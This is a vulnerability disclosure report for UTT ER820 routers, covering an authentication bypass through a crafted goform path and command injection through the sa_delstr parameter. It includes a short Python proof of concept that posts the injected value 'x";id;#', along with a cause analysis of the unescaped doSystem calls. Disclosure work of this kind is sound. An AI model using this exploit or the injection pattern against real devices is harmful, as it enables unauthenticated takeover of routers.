# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers 

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (IPSec_Clear / sub_4743C4)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `IPSec_Clear` (mapped to function `sub_4743C4`, ranges `0x474410-0x4744e4` / `0x474410-0x474568`) which can be reached via an authentication bypass, and then abused for command injection. Remote attackers can inject shell commands via the POST parameter `sa_delstr`.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    url = base_url.rstrip('/') + '/goform/IPSec_Clear/goform/formWebAuthUserSubmit'
    data = {
        'sa_delstr': 'x";id;#',
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: In `websSecurityHandler`, URLs containing `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` are dispatched to `websFormHandler` without normal auth enforcement. This enables a bypass using `/goform/IPSec_Clear/goform/formWebAuthUserSubmit`.

2. **command injection**: In `sub_4743C4`, the request parameter `sa_delstr` is obtained via `websGetVar`, split by `:`, and each token is passed to `doSystem()` as part of `ipsec` commands (e.g., `doSystem("ipsec auto --down \"%s\"", i)` and `doSystem("ipsec auto --delete \"%s\"", i)`). Because user data is not safely escaped, an attacker can break out of quoting and execute arbitrary commands.
